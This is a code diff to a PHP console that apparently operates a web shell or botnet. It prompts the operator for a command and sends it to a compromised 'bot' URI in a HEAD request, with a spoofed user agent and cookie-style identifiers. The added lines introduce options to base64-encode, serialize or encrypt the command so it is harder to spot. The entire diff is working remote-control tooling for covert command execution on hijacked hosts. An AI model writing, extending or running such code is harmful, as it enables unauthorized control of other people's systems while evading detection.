@@ -124,13 +124,30 @@ while (true) {
             ]
             );
             try {
+                echo <<<TYPES
+this shell supports the ability to serialize the commands (if you have multiple to execute at once on the specified host.
+encrypt the command you are trying to execute. This will also need to be decrypted in the client. This feature has not been introduced just yet, but will soon. (older versions have this ability, but that client script sucked.)
+And finally, to just send the raw command over.
+
+The options are:
+ 1b -> for no modification of the command other than base64 encoding it.
+ 1 -> serialize and base64 encode the command, this works well if you have spaces in your command.
+ e -> this will encrypt the command, in addition to base64 encoding it.
+TYPES;
+                $type = readline("Which of the 3 options would you like to select: ");
                 $command = $coms->head($bot[0]['uri'],
                     [
                         'headers' => [
-                            "cr" => "1b",
-                            "User-Agent" => $bot[0]['agent'],
-                            "Cookie" => sprintf("jsessionid=%s; %s=%s; uuid=%s; cr=1b", sprintf("%s", base64_encode(readline("What would you like to execute: "))), $bot[0]['cname'], $bot[0]['cvalue'], $bot[0]['uuid'])
+                            "User-Agent" => $bot[0]['agent']
                         ]
+                    ],
+                    [
+                        "cr" => $type,
+                        "command" => readline("What would you like to execute: "),
+                        "uuid" => $bot[0]['uuid'],
+                        "cname" => $bot[0]['cname'],
+                        "cval" => $bot[0]['cvalue'],
+                        ""
                     ]
                 );
             }catch (Exception $e){
